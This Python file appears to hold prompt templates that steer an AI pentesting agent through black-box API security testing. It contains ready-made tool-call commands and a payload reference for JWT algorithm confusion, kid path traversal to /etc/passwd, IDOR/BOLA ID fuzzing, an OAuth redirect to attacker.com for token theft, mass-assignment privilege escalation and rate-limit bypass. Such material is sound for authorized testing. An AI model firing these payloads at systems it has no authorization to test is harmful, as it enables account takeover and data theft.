"""
RedAmon API Security Testing Prompts

Black-box workflows for REST, GraphQL, and gRPC API security testing:
authentication/authorization flaws, IDOR/BOLA/BFLA, JWT/OAuth2 abuse,
GraphQL introspection/batching, mass assignment, rate-limit bypass,
API versioning issues, and documentation leakage.

This skill is DISTINCT from sql_injection, xss, ssrf, and rce — those are
injection primitives that may appear in API parameters. This skill covers
API-specific DESIGN and LOGIC flaws.
"""

# =============================================================================
# API SECURITY MAIN WORKFLOW
# =============================================================================

API_SECURITY_TOOLS = """
## ATTACK SKILL: API SECURITY TESTING

**CRITICAL: This attack skill has been CLASSIFIED as API Security Testing.**
**You MUST follow the API security workflow below. Do NOT switch to other attack methods.**

This skill covers THREE API paradigms:
1. **REST** — OpenAPI/Swagger discovery, HTTP method switching, IDOR, BOLA, BFLA
2. **GraphQL** — introspection, query depth/batching, field suggestion abuse,
   unauthorized type access, mutation abuse
3. **gRPC** — proto reflection, method enumeration, metadata interception

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
GraphQL introspection enabled:    {api_graphql_introspection_enabled}
JWT testing enabled:              {api_jwt_enabled}
OAuth flow testing enabled:       {api_oauth_enabled}
Rate-limit bypass enabled:        {api_rate_limit_enabled}
Mass assignment enabled:          {api_mass_assignment_enabled}
BOLA/BFLA deep testing enabled:   {api_bola_enabled}
API documentation discovery:      {api_doc_discovery_enabled}
Request timeout:                  {api_request_timeout}s
```

**Hard rules:**
- ALWAYS run Step 1 (API surface inventory) before firing test payloads.
- Test ONE flaw class at a time per endpoint. Parallel multi-class testing triggers
  WAFs and burns rate limits.
- If `Rate-limit bypass enabled: False`, respect 429 responses and back off.
- If `BOLA/BFLA deep testing enabled: False`, stop after shallow IDOR checks
  (single parameter swap). Do NOT fuzz every ID permutation.
- NEVER delete, modify, or create production resources via API mutations unless
  the operator explicitly authorizes the specific endpoint.

---

## MANDATORY API SECURITY WORKFLOW

### Step 1: API surface inventory (query_graph + execute_curl + execute_httpx)

Before testing, map the API attack surface:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' AND (e.url CONTAINS '/api/' OR e.url CONTAINS '/graphql' OR e.url CONTAINS '/grpc' OR e.url CONTAINS '/v1/' OR e.url CONTAINS '/v2/' OR e.url CONTAINS '/rest/') RETURN e.url, e.method, e.parameters, e.auth_type LIMIT 200
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' AND p.endpoint CONTAINS '/api/' RETURN p.name, p.location, p.endpoint, p.data_type LIMIT 100
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' AND (t.name CONTAINS 'GraphQL' OR t.name CONTAINS 'Swagger' OR t.name CONTAINS 'OpenAPI' OR t.name CONTAINS 'gRPC' OR t.name CONTAINS 'REST') RETURN t.name, t.version
```

If the graph lacks API data, probe directly:

```
# Common API base paths
execute_httpx({{"args": "-u http://TARGET/api -u http://TARGET/api/v1 -u http://TARGET/api/v2 -u http://TARGET/graphql -u http://TARGET/swagger.json -u http://TARGET/openapi.json -sc -title -server -silent -j"}})
# API doc discovery
execute_curl({{"args": "-s http://TARGET/swagger.json"}})
execute_curl({{"args": "-s http://TARGET/openapi.json"}})
execute_curl({{"args": "-s http://TARGET/api-docs"}})
execute_curl({{"args": "-s http://TARGET/.well-known/openapi"}})
```

Also check for JavaScript-driven API discovery:

```
execute_jsluice({{"args": "urls --resolve-paths http://TARGET /tmp/app.js"}})
```

Capture: base paths, auth mechanisms (Bearer, API key, cookie, OAuth), documented
endpoints, parameter types (UUID, integer, string), rate-limit headers.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Authentication & session testing

**2A. JWT analysis** (CONDITIONAL on `JWT testing enabled`=True)

```
# Run jwt_tool comprehensive tests
kali_shell({{"command": "jwt_tool <TOKEN> -M at"}})
```

Key checks:
- Algorithm confusion (alg: none, alg: HS256 with public key)
- Weak HMAC secret (brute with jwt_tool wordlist)
- Expired token acceptance
- Missing signature verification
- Kid header injection / path traversal

**2B. API key / token leakage**

```
# Search for hardcoded keys in JS, responses, error messages
execute_curl({{"args": "-s http://TARGET/api/v1/users -v"}})
# Check response headers for token echoes
execute_curl({{"args": "-s http://TARGET/api/v1/error -v"}})
```

**2C. OAuth2 / OIDC flow abuse** (CONDITIONAL on `OAuth flow testing enabled`=True)

```
# Discover OAuth endpoints
execute_curl({{"args": "-s http://TARGET/.well-known/openid-configuration"}})
# Common flaws:
# - redirect_uri not validated -> token theft
# - response_type=token (implicit) -> token in URL fragment
# - scope not enforced -> elevated access with low-priv client
# - PKCE missing -> authorization code interception
execute_curl({{"args": "-s 'http://TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=https://attacker.com/callback&response_type=code&scope=admin'"}})
```

### Step 3: Authorization flaws — IDOR / BOLA / BFLA

**3A. Shallow IDOR (parameter swap)**

For every endpoint with an object ID (UUID, integer, string), test horizontal
and vertical access:

```
# Baseline: authenticated user's own resource
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v1/users/me/orders/1234'"}})
# Horizontal: another user's resource (predictable ID)
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v1/users/me/orders/1235'"}})
# Vertical: admin endpoint with low-priv token
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v1/admin/users'"}})
```

**3B. BOLA deep testing** (CONDITIONAL on `BOLA/BFLA deep testing enabled`=True)

Fuzz object ID patterns with ffuf when IDs are sequential or partially predictable:

```
execute_ffuf({{"args": "-w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://TARGET/api/v1/invoices/FUZZ' -H 'Authorization: Bearer <TOKEN>' -mc 200 -fs 0 -ac -noninteractive"}})
```

**3C. BFLA (Broken Function Level Authorization)**

Test HTTP method switching and path traversal on admin/modifier endpoints:

```
execute_curl({{"args": "-s -X DELETE -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v1/users/me'"}})
execute_curl({{"args": "-s -X PUT -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\"}}' 'http://TARGET/api/v1/users/me'"}})
execute_curl({{"args": "-s -X PATCH -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{{\"isAdmin\":true}}' 'http://TARGET/api/v1/users/me'"}})
```

### Step 4: GraphQL-specific testing (CONDITIONAL on `GraphQL introspection enabled`=True)

Only if a `/graphql` endpoint was discovered in Step 1.

```
# Introspection query
execute_curl({{"args": "-s -X POST -H 'Content-Type: application/json' -d '{{"query":"{{ __schema {{ types {{ name }} }} }}"}}' 'http://TARGET/graphql'"}})
# If introspection is disabled, try field suggestion:
execute_curl({{"args": "-s -X POST -H 'Content-Type: application/json' -d '{{"query":"{{ a }}"}}' 'http://TARGET/graphql'"}})
# Query depth / complexity abuse
execute_curl({{"args": "-s -X POST -H 'Content-Type: application/json' -d '{{"query":"{{ user {{ id orders {{ items {{ product {{ name }} }} }} }} }}"}}' 'http://TARGET/graphql'"}})
# Batch queries (array of queries)
execute_curl({{"args": "-s -X POST -H 'Content-Type: application/json' -d '[{{"query":"{{ user {{ id }} }}"}},{{"query":"{{ adminUsers {{ id }} }}"}}]' 'http://TARGET/graphql'"}})
```

Tools: `graphql-cop` and `graphqlmap` (pre-installed in kali_shell):

```
kali_shell({{"command": "graphql-cop -t http://TARGET/graphql"}})
kali_shell({{"command": "graphqlmap -u http://TARGET/graphql"}})
```

### Step 5: Mass assignment (CONDITIONAL on `Mass assignment enabled`=True)

Send extra fields in POST/PUT/PATCH bodies to test for unfiltered model binding:

```
# Expected body
execute_curl({{"args": "-s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' -d '{{"username":"alice","email":"alice@example.com"}}' 'http://TARGET/api/v1/users'"}})
# Mass assignment attempt
execute_curl({{"args": "-s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' -d '{{"username":"alice","email":"alice@example.com","role":"admin","isAdmin":true,"balance":99999}}' 'http://TARGET/api/v1/users'"}})
```

Look for: 200 OK with extra fields persisted, role escalation, balance manipulation.

### Step 6: Rate-limit bypass (CONDITIONAL on `Rate-limit bypass enabled`=True)

```
# Test standard rate limiting
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v1/search?q=test'"}})
# Bypass vectors:
# - X-Forwarded-For IP rotation
# - X-Real-IP spoofing
# - User-Agent rotation
# - API key rotation (multiple keys)
# - Case variation on path (/API/v1/ vs /api/v1/)
# - Null byte / encoding in path
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' -H 'X-Forwarded-For: 1.2.3.4' 'http://TARGET/api/v1/search?q=test'"}})
```

### Step 7: API versioning & deprecation issues

```
# Older versions often have weaker auth or missing patches
execute_httpx({{"args": "-u http://TARGET/api/v1 -u http://TARGET/api/v2 -u http://TARGET/api/v3 -u http://TARGET/api/beta -sc -title -silent -j"}})
# Compare responses between versions for the same endpoint
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v1/users/me'"}})
execute_curl({{"args": "-s -H 'Authorization: Bearer <TOKEN>' 'http://TARGET/api/v2/users/me'"}})
```

### Step 8: Reporting requirements

The final report MUST contain:
- **API type** (REST / GraphQL / gRPC / mixed)
- **Authentication findings** (JWT flaws, key leakage, OAuth misconfig)
- **Authorization findings** (IDOR/BOLA/BFLA — specific endpoints + IDs tested)
- **GraphQL findings** (introspection status, depth limit, batching, field suggestions)
- **Mass assignment findings** (fields accepted but should be rejected)
- **Rate-limit status** (bypassed or enforced, headers observed)
- **Versioning issues** (deprecated endpoints with weaker security)
- **Exact reproducer** (curl command or JSON body sent)
- **Remediation** (authz checks on every endpoint, input allowlisting, rate-limit by identity)

### Proof Levels

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | API surface mapped, auth mechanism identified | INFORMATIONAL |
| 2 | JWT weakness / OAuth misconfig / key leakage confirmed | POTENTIAL |
| 3 | IDOR / BOLA / BFLA executed — access to unauthorized data/function | EXPLOITED |
| 4 | Mass assignment -> privilege escalation, or GraphQL batching -> admin data dump | EXPLOITED (CRITICAL) |

Only report Level 3+ as exploited.
"""


# =============================================================================
# API SECURITY PAYLOAD REFERENCE
# =============================================================================

API_SECURITY_PAYLOAD_REFERENCE = """
## API Security Payload Reference

### JWT attacks

| Attack | Payload / Technique | Indicator of success |
|--------|---------------------|----------------------|
| Algorithm confusion | Change `alg` to `none`, remove signature | Token accepted without signature |
| Algorithm swap RS256->HS256 | Sign with public key as HMAC secret | Token accepted with HS256 + pubkey |
| Weak secret brute | `jwt_tool TOKEN -C -d wordlist.txt` | Valid signature found |
| Kid injection / path traversal | `"kid": "../../../dev/null"` or `"kid": "../../../../etc/passwd"` | Error discloses file path |
| JWK injection | Embed attacker-controlled JWK in header | Token accepted with injected key |
| Expired token reuse | Send token after `exp` | Token still accepted |

### IDOR / BOLA patterns

```
# Predictable sequential IDs
/api/v1/orders/1001  ->  /api/v1/orders/1002
/api/v1/users/42     ->  /api/v1/users/43

# UUIDv1 predictability (time-based)
# If UUIDv1 is used, timestamp is embedded — brute nearby timestamps

# Parameter pollution
/api/v1/orders?id=MY_ID&id=VICTIM_ID

# Array of IDs
/api/v1/orders?ids[]=MY_ID&ids[]=VICTIM_ID

# Wildcard / bulk endpoints
/api/v1/orders/*
/api/v1/orders/all
```

### GraphQL introspection (when enabled)

```json
{"query": "{__schema{queryType{name} mutationType{name} subscriptionType{name} types{...FullType} directives{name description locations args{...InputValue}}}} fragment FullType on __Type {kind name description fields(includeDeprecated:true){name description args{...InputValue} type{...TypeRef} isDeprecated deprecationReason} inputFields{...InputValue} interfaces{...TypeRef} enumValues(includeDeprecated:true){name description isDeprecated deprecationReason} possibleTypes{...TypeRef}} fragment InputValue on __InputValue {name description type{...TypeRef} defaultValue} fragment TypeRef on __Type {kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

### Mass assignment field candidates

Common fields that should be server-side controlled but are sometimes bound:
```json
{"role": "admin", "isAdmin": true, "is_staff": true, "privileges": ["all"],
 "balance": 99999, "credits": 99999, "accountType": "enterprise",
 "verified": true, "approved": true, "owner_id": 1, "created_at": "2000-01-01"}
```

### Rate-limit bypass vectors

| Technique | Header / Payload | When it works |
|---|---|---|
| X-Forwarded-For rotation | `X-Forwarded-For: 1.2.3.4` | Rate limit keyed on header IP |
| X-Real-IP spoofing | `X-Real-IP: 1.2.3.4` | Similar to above |
| Case variation | `/API/v1/` vs `/api/v1/` | Case-sensitive route matching |
| Trailing slash | `/api/v1/users` vs `/api/v1/users/` | Normalization gaps |
| Encoding | `/api%2Fv1%2Fusers` | URL-decode differences |
| Method override | `X-HTTP-Method-Override: GET` | Some frameworks re-route |
| API key cycling | Rotate `X-Api-Key` values | Per-key limits, not per-user |

### gRPC testing (when detected)

```bash
# Proto reflection
grpcurl -plaintext TARGET:PORT list
grpcurl -plaintext TARGET:PORT list my.package.Service
grpcurl -plaintext TARGET:PORT describe my.package.Service.Method

# Without reflection: fuzz method names via wordlist
```
"""
